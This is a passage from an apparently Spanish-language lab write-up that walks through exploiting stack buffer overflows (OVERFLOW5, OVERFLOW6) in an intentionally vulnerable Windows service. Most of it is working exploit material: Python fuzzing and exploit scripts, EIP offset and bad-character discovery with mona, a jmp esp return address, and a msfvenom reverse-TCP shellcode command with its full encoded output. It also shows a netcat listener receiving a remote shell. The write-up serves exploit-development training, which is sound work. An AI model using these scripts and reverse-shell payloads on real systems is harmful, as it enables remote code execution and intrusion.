\u0026#34;\\xd0\\xd2\\xe8\\xd1\\x15\\xd4\\x12\\xa4\\x6f\\x26\\xae\\xbf\\xb4\\x54\\x74\u0026#34; \u0026#34;\\x35\\x2e\\xfe\\xff\\xed\\x8a\\xfe\\x2c\\x6b\\x59\\x0c\\x98\\xff\\x05\\x11\u0026#34; \u0026#34;\\x1f\\xd3\\x3e\\x2d\\x94\\xd2\\x90\\xa7\\xee\\xf0\\x34\\xe3\\xb5\\x99\\x6d\u0026#34; \u0026#34;\\x49\\x1b\\xa5\\x6d\\x32\\xc4\\x03\\xe6\\xdf\\x11\\x3e\\xa5\\xb7\\xd6\\x73\u0026#34; \u0026#34;\\x55\\x48\\x71\\x03\\x26\\x7a\\xde\\xbf\\xa0\\x36\\x97\\x19\\x37\\x38\\x82\u0026#34; \u0026#34;\\xde\\xa7\\xc7\\x2d\\x1f\\xee\\x03\\x79\\x4f\\x98\\xa2\\x02\\x04\\x58\\x4a\u0026#34; \u0026#34;\\xd7\\x8b\\x08\\xe4\\x88\\x6b\\xf8\\x44\\x79\\x04\\x12\\x4b\\xa6\\x34\\x1d\u0026#34; \u0026#34;\\x81\\xcf\\xdf\\xe4\\x42\\x30\\xb7\\xf0\\x93\\xd8\\xca\\xfc\\x96\\x22\\x42\u0026#34; \u0026#34;\\x1a\\xf2\\x42\\x02\\xb5\\x6b\\xfa\\x0f\\x4d\\x0d\\x03\\x9a\\x28\\x0d\\x8f\u0026#34; \u0026#34;\\x29\\xcd\\xc0\\x78\\x47\\xdd\\xb5\\x88\\x12\\xbf\\x10\\x96\\x88\\xd7\\xff\u0026#34; \u0026#34;\\x05\\x57\\x27\\x89\\x35\\xc0\\x70\\xde\\x88\\x19\\x14\\xf2\\xb3\\xb3\\x0a\u0026#34; \u0026#34;\\x0f\\x25\\xfb\\x8e\\xd4\\x96\\x02\\x0f\\x98\\xa3\\x20\\x1f\\x64\\x2b\\x6d\u0026#34; \u0026#34;\\x4b\\x38\\x7a\\x3b\\x25\\xfe\\xd4\\x8d\\x9f\\xa8\\x8b\\x47\\x77\\x2c\\xe0\u0026#34; \u0026#34;\\x57\\x01\\x31\\x2d\\x2e\\xed\\x80\\x98\\x77\\x12\\x2c\\x4d\\x70\\x6b\\x50\u0026#34; \u0026#34;\\xed\\x7f\\xa6\\xd0\\x0d\\x62\\x62\\x2d\\xa6\\x3b\\xe7\\x8c\\xab\\xbb\\xd2\u0026#34; \u0026#34;\\xd3\\xd5\\x3f\\xd6\\xab\\x21\\x5f\\x93\\xae\\x6e\\xe7\\x48\\xc3\\xff\\x82\u0026#34; \u0026#34;\\x6e\\x70\\xff\\x86\\x6e\\x76\\xff\\x28\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501205) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 314 + eip_ret + nops + shellcode + padding * (850 - 314 - 4 - 16 - 353 ) try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW5 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 ➜ OVERFLOW_5 nc -lnvp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49210 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; Overflow 6 Fuzzing Realizamos fuzzing al segundo reto utilizando esta vez OVERFLOW6.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW6 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Encontramos que el programa se detuvo con 1400 bytes.\n1 2 3 4 ➜ OVERFLOW_6 ./overflow6.py 192.168.22.128 [▘] Progreso: Enviando 1400 bytes. [-] Parece que el programa se detuvo con 1400 bytes. ➜ OVERFLOW_6 Observamos que el registro EIP se sobreescribió con “A\u0026quot;s, tambien vemos el registro ESP con los mismos valores.\nOffset EIP Creamos un patron de 1500 bytes utilizando pattern_create.rb.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 1500 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9 Modificamos el script para realizar el envio de este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 buff = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9\u0026#34; try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW6 %s\\r\\n\u0026#34; % buff) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34;) El registro EIP está lleno con el patron enviado asi mismo el registro ESP.\nMona nos muestra el offset con valor de 1034 bytes.\n1 2 3 4 5 6 7 8 9 # !mona findmsp -distance 1500 [+] Command used: !mona findmsp -distance 1500 [..] [+] Examining registers EIP contains normal pattern : 0x35694234 (offset 1034) ESP (0x016efa30) points at offset 1038 in normal pattern (length 462) EBP contains normal pattern : 0x69423369 (offset 1030) EBX contains normal pattern : 0x42326942 (offset 1026) Control EIP Utilizando la longitud del offset agregamos “B\u0026quot;s para confirmar que el offset es exacto y que tenemos el control del registro EIP, además agregamos un padding para mantener la longitud del buffer (1500).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1034 + eip_ret + nops + padding * (1500-1034-4) # junk 1034, eip 4, padding 462 = 1500 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW6 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script vemos que el registro EIP contiene “B\u0026quot;s lo que significa que el offset es exacto, además vemos el registro ESP con el padding (“C\u0026quot;s).\nEspacio - Shellcode Aumentamos el padding para tener asegurado un espacio ‘decente’ para nuestro shellcode, en este caso 50 bytes adicionales, en total tendríamos 496 bytes disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1034 + eip_ret + nops + padding * (1500 - 1034 - 4 - 16 + 50) # 496 padding # 1034 junk, 4 eip_ret, padding 496 (shellcode + nops) # total buffer = 1534 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW6 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) El debugger muestra el mismo comportamiento por lo que tomamos la longitud del buffer en 1534 bytes de los cuales 496 bytes serán para el shellcode y los nops (16 bytes).\nBadChars Generamos con mona un array con todos los badchars exeptuando el valor null (\\x00).\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Modificamos el script con nuestro array de badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1034 + eip_ret + nops + badchars + padding * (1534 - 1034 - 4 - 255) # 255 badchars try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW6 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Realizamos la busqueda de badchars como en el primer reto. Inicialmente encontramos los badchars \u0026quot;\\x00\\x08\\x2c\\xad\u0026quot;.\n1 \\x00\\x08\\x2c\\xad JMP ESP Buscamos una instrucción de salto al ESP con mona.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x08\\x2c\\xad\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\x08\\x2c\\xad\u0026#34; Encontramos dos direcciones de memoria con la instrucción jmp esp sin ningun tipo de protección.\n1 2 3 4 5 6 7 8 9 10 11 12 13 [+] Command used: !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x08\\x2c\\xad\u0026#34; [+] Results : 0x625011af : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011bb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011c7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011d3 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011df : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011eb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011f7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501203 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) Found a total of 9 pointers Modificamos nuestr script agregando la dirección de la instrucción.\n1 2 3 from struct import pack eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501203) Shellcode Creamos nuestro shellcode pasandole los badchars que encontramos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\x08\\x2c\\xad\u0026#34; Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of c file: 1500 bytes unsigned char buf[] = \u0026#34;\\xda\\xcc\\xd9\\x74\\x24\\xf4\\xbf\\x95\\x7d\\x42\\x1d\\x5a\\x29\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x31\\x7a\\x17\\x03\\x7a\\x17\\x83\\x7f\\x81\\xa0\\xe8\\x83\\x92\\xa7\u0026#34; \u0026#34;\\x13\\x7b\\x63\\xc8\\x9a\\x9e\\x52\\xc8\\xf9\\xeb\\xc5\\xf8\\x8a\\xb9\\xe9\u0026#34; \u0026#34;\\x73\\xde\\x29\\x79\\xf1\\xf7\\x5e\\xca\\xbc\\x21\\x51\\xcb\\xed\\x12\\xf0\u0026#34; \u0026#34;\\x4f\\xec\\x46\\xd2\\x6e\\x3f\\x9b\\x13\\xb6\\x22\\x56\\x41\\x6f\\x28\\xc5\u0026#34; \u0026#34;\\x75\\x04\\x64\\xd6\\xfe\\x56\\x68\\x5e\\xe3\\x2f\\x8b\\x4f\\xb2\\x24\\xd2\u0026#34; \u0026#34;\\x4f\\x35\\xe8\\x6e\\xc6\\x2d\\xed\\x4b\\x90\\xc6\\xc5\\x20\\x23\\x0e\\x14\u0026#34; \u0026#34;\\xc8\\x88\\x6f\\x98\\x3b\\xd0\\xa8\\x1f\\xa4\\xa7\\xc0\\x63\\x59\\xb0\\x17\u0026#34; \u0026#34;\\x19\\x85\\x35\\x83\\xb9\\x4e\\xed\\x6f\\x3b\\x82\\x68\\xe4\\x37\\x6f\\xfe\u0026#34; \u0026#34;\\xa2\\x5b\\x6e\\xd3\\xd9\\x60\\xfb\\xd2\\x0d\\xe1\\xbf\\xf0\\x89\\xa9\\x64\u0026#34; \u0026#34;\\x98\\x88\\x17\\xca\\xa5\\xca\\xf7\\xb3\\x03\\x81\\x1a\\xa7\\x39\\xc8\\x72\u0026#34; \u0026#34;\\x04\\x70\\xf2\\x82\\x02\\x03\\x81\\xb0\\x8d\\xbf\\x0d\\xf9\\x46\\x66\\xca\u0026#34; \u0026#34;\\xfe\\x7c\\xde\\x44\\x01\\x7f\\x1f\\x4d\\xc6\\x2b\\x4f\\xe5\\xef\\x53\\x04\u0026#34; \u0026#34;\\xf5\\x10\\x86\\x8b\\xa5\\xbe\\x79\\x6c\\x15\\x7f\\x2a\\x04\\x7f\\x70\\x15\u0026#34; \u0026#34;\\x34\\x80\\x5a\\x3e\\xdf\\x7b\\x0d\\x81\\x88\\x95\\xcc\\x69\\xcb\\x99\\xcb\u0026#34; \u0026#34;\\x53\\x42\\x7f\\xb9\\xb3\\x02\\x28\\x56\\x2d\\x0f\\xa2\\xc7\\xb2\\x85\\xcf\u0026#34; \u0026#34;\\xc8\\x39\\x2a\\x30\\x86\\xc9\\x47\\x22\\x7f\\x3a\\x12\\x18\\xd6\\x45\\x88\u0026#34; \u0026#34;\\x34\\xb4\\xd4\\x57\\xc4\\xb3\\xc4\\xcf\\x93\\x94\\x3b\\x06\\x71\\x09\\x65\u0026#34; \u0026#34;\\xb0\\x67\\xd0\\xf3\\xfb\\x23\\x0f\\xc0\\x02\\xaa\\xc2\\x7c\\x21\\xbc\\x1a\u0026#34; \u0026#34;\\x7c\\x6d\\xe8\\xf2\\x2b\\x3b\\x46\\xb5\\x85\\x8d\\x30\\x6f\\x79\\x44\\xd4\u0026#34; \u0026#34;\\xf6\\xb1\\x57\\xa2\\xf6\\x9f\\x21\\x4a\\x46\\x76\\x74\\x75\\x67\\x1e\\x70\u0026#34; \u0026#34;\\x0e\\x95\\xbe\\x7f\\xc5\\x1d\\xde\\x9d\\xcf\\x6b\\x77\\x38\\x9a\\xd1\\x1a\u0026#34; \u0026#34;\\xbb\\x71\\x15\\x23\\x38\\x73\\xe6\\xd0\\x20\\xf6\\xe3\\x9d\\xe6\\xeb\\x99\u0026#34; \u0026#34;\\x8e\\x82\\x0b\\x0d\\xae\\x86\u0026#34;; Agregamos nuestro shellcode y NOPs, finalmente calculamos el padding para mantener la longitud de nuestro buffer (1534).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 shellcode = (\u0026#34;\\xda\\xcc\\xd9\\x74\\x24\\xf4\\xbf\\x95\\x7d\\x42\\x1d\\x5a\\x29\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x31\\x7a\\x17\\x03\\x7a\\x17\\x83\\x7f\\x81\\xa0\\xe8\\x83\\x92\\xa7\u0026#34; \u0026#34;\\x13\\x7b\\x63\\xc8\\x9a\\x9e\\x52\\xc8\\xf9\\xeb\\xc5\\xf8\\x8a\\xb9\\xe9\u0026#34; \u0026#34;\\x73\\xde\\x29\\x79\\xf1\\xf7\\x5e\\xca\\xbc\\x21\\x51\\xcb\\xed\\x12\\xf0\u0026#34; \u0026#34;\\x4f\\xec\\x46\\xd2\\x6e\\x3f\\x9b\\x13\\xb6\\x22\\x56\\x41\\x6f\\x28\\xc5\u0026#34; \u0026#34;\\x75\\x04\\x64\\xd6\\xfe\\x56\\x68\\x5e\\xe3\\x2f\\x8b\\x4f\\xb2\\x24\\xd2\u0026#34; \u0026#34;\\x4f\\x35\\xe8\\x6e\\xc6\\x2d\\xed\\x4b\\x90\\xc6\\xc5\\x20\\x23\\x0e\\x14\u0026#34; \u0026#34;\\xc8\\x88\\x6f\\x98\\x3b\\xd0\\xa8\\x1f\\xa4\\xa7\\xc0\\x63\\x59\\xb0\\x17\u0026#34; \u0026#34;\\x19\\x85\\x35\\x83\\xb9\\x4e\\xed\\x6f\\x3b\\x82\\x68\\xe4\\x37\\x6f\\xfe\u0026#34; \u0026#34;\\xa2\\x5b\\x6e\\xd3\\xd9\\x60\\xfb\\xd2\\x0d\\xe1\\xbf\\xf0\\x89\\xa9\\x64\u0026#34; \u0026#34;\\x98\\x88\\x17\\xca\\xa5\\xca\\xf7\\xb3\\x03\\x81\\x1a\\xa7\\x39\\xc8\\x72\u0026#34; \u0026#34;\\x04\\x70\\xf2\\x82\\x02\\x03\\x81\\xb0\\x8d\\xbf\\x0d\\xf9\\x46\\x66\\xca\u0026#34; 